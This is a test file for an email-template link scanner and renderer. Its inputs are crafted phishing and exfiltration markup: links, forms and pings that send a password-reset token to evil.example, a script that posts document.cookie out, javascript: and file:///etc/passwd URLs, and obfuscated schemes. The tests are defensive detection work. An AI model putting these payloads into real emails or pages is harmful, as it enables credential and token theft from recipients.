// SPDX-License-Identifier: AGPL-3.0-only
/**
 * EVERY HOST AN EMAIL CAN SEND A PERSON TO, READ AS A MAIL CLIENT READS IT.
 *
 * Each way past the old reader (a raw markup block, an entity, a slash too
 * few or a backslash, a percent escape, an attribute nobody listed, a style,
 * a refresh, an Outlook comment) still names its host; what cannot be told
 * (a host filled in later, a script, `javascript:`) is a problem, never a
 * guess. The renderer draws a link only when it is written plainly.
 */
import { describe, expect, it } from 'vitest';

import { emailLinks } from '../src/email/link-hosts.js';
import { plainLink } from '../src/email/plain-link.js';
import { renderEmail } from '../src/email/render.js';

const RESET = ['resetUrl'];
const html = (code: string) => ({ subject: 'Reset', blocks: [{ block: 'email.html', data: { code } }] });
const button = (url: string) => ({ subject: 'Reset', blocks: [{ block: 'email.button', data: { label: 'Go', url } }] });
const text = (words: string) => ({ subject: 'Reset', blocks: [{ block: 'email.text', data: { text: words } }] });
const read = (content: unknown) => emailLinks(content, RESET);

describe('the hosts of an email', () => {
  it('a button to this server alone names no host and no problem', () => {
    expect(read(button('{{resetUrl}}'))).toEqual({ hosts: [], carried: [], carries: {}, problems: [] });
    expect(read(html('<a href="{{resetUrl}}">Choose a new password</a>'))).toEqual({ hosts: [], carried: [], carries: {}, problems: [] });
  });

  it('plain links, in words and in fields, without user, port or a closing dot', () => {
    expect(read({ subject: 'See https://a.example', blocks: [{ data: { text: 'http://User@B.example:8080/x and https://a.example/y.', url: '//c.example/z' } }] }).hosts).toEqual(['a.example', 'b.example', 'c.example']);
  });

  it('a raw markup block: a link with no scheme, carrying the reset link, is refused', () => {
    const links = read(html('<a href="//evil.example/r?t={{resetUrl}}">Reset</a>'));
    expect(links.hosts).toEqual(['evil.example']);
    expect(links.problems).toContain('it sends {{resetUrl}} to "evil.example"');
  });

  it('an entity-encoded scheme, in markup and in a field', () => {
    expect(read(html('<a href="https&#58;//evil.example/x">x</a>')).hosts).toEqual(['evil.example']);
    expect(read(html('<a href="https&colon;&sol;&sol;evil.example/x">x</a>')).hosts).toEqual(['evil.example']);
    expect(read(button('https&#58;//evil.example/x')).hosts).toEqual(['evil.example']);
  });

  it('a slash too few, a backslash, no slash at all: the host a browser goes to', () => {
    for (const url of ['https:/evil.example/x', 'https:evil.example/x', 'https:\\\\evil.example/x', 'https:/\\evil.example/x', '\\\\evil.example/x', '/\\evil.example/x', ' https://evil.example', 'ht\ttps://evil.example/']) {
      expect(read(button(url)).hosts, url).toEqual(['evil.example']);
      expect(read(html(`<a href="${url}">x</a>`)).hosts, url).toEqual(['evil.example']);
    }
  });

  it('percent-encoded and full-width dots, and an encoded scheme', () => {
    expect(read(button('https://evil%2Eexample/x')).hosts).toEqual(['evil.example']);
    expect(read(html('<a href="https://evil。example/x">x</a>')).hosts).toEqual(['evil.example']);
    expect(read(html('<a href="https%3A%2F%2Fevil.example%2Fx">x</a>')).hosts).toEqual(['evil.example']);
  });

  it('every attribute that loads or sends', () => {
    const cases: [string, string][] = [
      ['src', '<img src="https://a.example/p.png">'],
      ['srcset', '<img srcset="https://a.example/1.png 1x, //b.example/2.png 2x">'],
      ['action', '<form action="https://a.example/f"></form>'],
      ['formaction', '<button formaction="https://a.example/f">x</button>'],
      ['background', '<table background="https://a.example/bg.png"></table>'],
      ['poster', '<video poster="https://a.example/p.png"></video>'],
      ['ping', '<a href="#" ping="https://a.example/p">x</a>'],
      ['svg', '<svg><a xlink:href="https://a.example/x"><text>x</text></a><image href="//a.example/i.png"/></svg>'],
    ];
    for (const [name, code] of cases) expect(read(html(code)).hosts.length, name).toBeGreaterThan(0);
    expect(read(html('<img srcset="https://a.example/1.png 1x, //b.example/2.png 2x">')).hosts).toEqual(['a.example', 'b.example']);
  });

  it('styles: url(), @import, an escaped url(), and code a style runs', () => {
    expect(read(html('<td style="background-image:url(//a.example/bg.png)">x</td>')).hosts).toEqual(['a.example']);
    expect(read(html('<style>@import "https://b.example/s.css"; td { background: url(\'https://c.example/x\') }</style>')).hosts).toEqual(['b.example', 'c.example']);
    expect(read(html('<td style="background:u\\72l(//d.example/bg.png)">x</td>')).hosts).toEqual(['d.example']);
    expect(read(html('<td style="width:expression(alert(1))">x</td>')).problems).toContain('a style in it runs code');
  });

  it('a refresh, an Outlook comment, a template, noscript and srcdoc', () => {
    expect(read(html('<meta http-equiv="refresh" content="0; url=https://a.example/r">')).hosts).toEqual(['a.example']);
    expect(read(html('<!--[if mso]><v:roundrect href="https://b.example/x"></v:roundrect><![endif]-->')).hosts).toEqual(['b.example']);
    expect(read(html('<template><a href="https://c.example/x">x</a></template>')).hosts).toEqual(['c.example']);
    expect(read(html('<noscript><img src="https://d.example/x.png"></noscript>')).hosts).toEqual(['d.example']);
    expect(read(html('<iframe srcdoc="&lt;img src=&quot;https://e.example/x&quot;&gt;"></iframe>')).hosts).toEqual(['e.example']);
  });

  it('a bare domain a mail client links on its own, and the reset link beside it', () => {
    expect(read(text('Write to help.fernhill.example any time.')).hosts).toEqual(['help.fernhill.example']);
    expect(read(text('Open evil.example/r?t={{resetUrl}} now')).problems).toEqual(["it sends one of this server's own links to \"evil.example\""]);
    expect(read(html('<p>evil.example/?t={{resetUrl}}</p>')).problems.length).toBeGreaterThan(0);
  });

  it('kinds of address an email may not hold are problems', () => {
    for (const url of ['javascript:alert(1)', 'java\tscript:alert(1)', 'JaVaScRiPt:alert(1)', 'data:text/html,<b>x</b>', 'vbscript:x', 'file:///etc/passwd']) {
      expect(read(button(url)).problems.length, url).toBeGreaterThan(0);
      expect(read(html(`<a href="${url}">x</a>`)).problems.length, url).toBeGreaterThan(0);
    }
    expect(read(html('<a href="java&#x09;script:alert(1)">x</a>')).problems.length).toBeGreaterThan(0);
    expect(read(html('<a href="mailto:help@fernhill.example">x</a>')).hosts).toEqual(['fernhill.example']);
    expect(read(html('<img src="cid:logo">')).problems).toEqual([]);
  });

  it('a script and an event handler are problems', () => {
    expect(read(html('<script>location="https://a.example/"+document.cookie</script>')).problems).toContain('it holds a <script>, which runs code');
    expect(read(html('<img src="cid:x" onerror="fetch(1)">')).problems).toContain('it runs code when "onerror" fires');
  });

  it('a host filled in when the mail is sent cannot be told', () => {
    for (const url of ['{{name}}', 'https://{{name}}/x', 'https://evil{{name}}/x', '/{{name}}/x', '{{resetUrl}}.evil.example/x']) {
      expect(read(button(url)).problems.length, url).toBeGreaterThan(0);
    }
    // In the path, the host stays where it is.
    expect(read(button('https://good.example/x/{{name}}?q={{email}}'))).toEqual({ hosts: ['good.example'], carried: ['good.example'], carries: { 'good.example': ['email', 'name'] }, problems: [] });
    expect(read(button('{{resetUrl}}@evil.example')).problems).toContain('it sends {{resetUrl}} to "evil.example"');
  });

  it('a backup is read as written', () => {
    expect(read(button('{{resetUrl|https://evil.example/}}')).hosts).toEqual(['evil.example']);
    expect(read(text('Hi {{name|see evil.example}}')).hosts).toEqual(['evil.example']);
  });

  it('a <base> moves every relative link to its host: a problem, never a host to tick', () => {
    const based = read(html('<base href="https://evil.example/"><a href="r?t={{resetUrl}}">Reset</a>'));
    expect(based.problems).toContain('it holds a <base>, which sends every relative link in it to another address');
    expect(read(html('<base target="_blank"><a href="{{resetUrl}}">Reset</a>')).problems).toContain('it holds a <base>, which sends every relative link in it to another address');
    expect(read(html('<svg xml:base="https://evil.example/"><a xlink:href="r?t={{resetUrl}}">Reset</a></svg>')).problems).toContain('it holds "xml:base", which sends every relative link under it to another address');
  });

  it('a value the caller keeps never rides to an outside host, in any link, ticked or not', () => {
    const kept = (name: string) => name === 'code';
    const keep = (content: unknown) => emailLinks(content, RESET, kept);
    for (const code of [
      '<img src="https://cdn.brand.example/l.png?c={{code}}">',
      '<img srcset="https://cdn.brand.example/l.png?c={{code}} 2x">',
      '<a href="https://cdn.brand.example/">Go</a><p style="background:url(https://cdn.brand.example/b?c={{code}})">x</p>',
      '<a href="https://help.example/" ping="https://cdn.brand.example/p">{{code}}</a><a href="https://help.example/?c={{code}}" ping="https://cdn.brand.example/p">x</a>',
      '<form action="https://cdn.brand.example/f"><input type="hidden" name="c" value="{{code}}"></form>',
      '<form id="f" action="https://cdn.brand.example/f"></form><input form="f" type="hidden" value="{{code}}">',
      '<button formaction="https://cdn.brand.example/f">Go</button><input type="hidden" value="{{code}}">',
    ]) {
      expect(keep(html(code)).problems, code).toContain('it sends {{code}} to "cdn.brand.example"');
    }
    expect(keep(text('Your code: cdn.brand.example/{{code}}')).problems).toContain('it sends {{code}} to "cdn.brand.example"');
    // The words of the mail may hold it: only a link to an outside host may not.
    expect(keep(text('Your code is {{code}}. Help: https://help.example/'))).toEqual({ hosts: ['help.example'], carried: [], carries: {}, problems: [] });
  });

  it('a form or a ping sent to an outside host carries the placeholders with it', () => {
    expect(read(html('<form action="https://evil.example/f"><input type="hidden" value="{{resetUrl}}"><input value="{{name}}"></form>')).problems).toContain('it sends {{resetUrl}} to "evil.example"');
    expect(read(html('<form action="https://forms.example/f"><input type="hidden" value="{{name}}"></form>'))).toEqual({ hosts: ['forms.example'], carried: ['forms.example'], carries: { 'forms.example': ['name'] }, problems: [] });
    expect(read(html('<a href="{{resetUrl}}" ping="https://evil.example/p">Reset</a>')).problems).toContain('it sends {{resetUrl}} to "evil.example"');
  });

  it('the names of blocks and tables are no hosts', () => {
    expect(read({ subject: 's', blocks: [{ id: 'a.b', block: 'email.text', data: { text: 'Hi' } }, { block: 'email.rows', data: { from: { table: 'public.orders' } } }] }).hosts).toEqual([]);
  });
});

describe('a link the renderer draws', () => {
  it('only as written plainly', () => {
    for (const url of ['https://good.example/x', 'http://good.example', 'mailto:a@good.example', 'https://good.example/a b?c=d\\e']) expect(plainLink(url, ['http', 'https', 'mailto']), url).toBe(true);
    for (const url of ['https:/evil.example', 'https:evil.example', 'https:\\\\evil.example', 'https:///evil.example', 'https://good.example@evil.example/', 'https://good.example\\evil.example', 'https://ev\til.example', 'javascript:alert(1)', 'https&#58;//evil.example', '//evil.example']) {
      expect(plainLink(url, ['http', 'https', 'mailto']), url).toBe(false);
    }
  });

  it('a button and a social link to a host that is not written plainly lead nowhere', () => {
    const document = {
      subject: 's',
      blocks: [
        { block: 'email.button', data: { label: 'Go', url: 'https:/evil.example/{{resetUrl}}' } },
        { block: 'email.social', data: { links: [{ label: 'X', url: 'https:\\\\evil.example/' }] } },
        { block: 'email.image', data: { url: 'https:evil.example/p.png', alt: 'p' } },
        { block: 'email.button', data: { label: 'Fine', url: '{{resetUrl}}' } },
      ],
    };
    const out = renderEmail({ document, locale: 'en_US', vars: { resetUrl: 'https://desk.example/reset?t=1' }, dir: 'ltr' });
    expect(out.html).not.toContain('evil.example');
    expect(out.html).toContain('href="https://desk.example/reset?t=1"');
  });
});
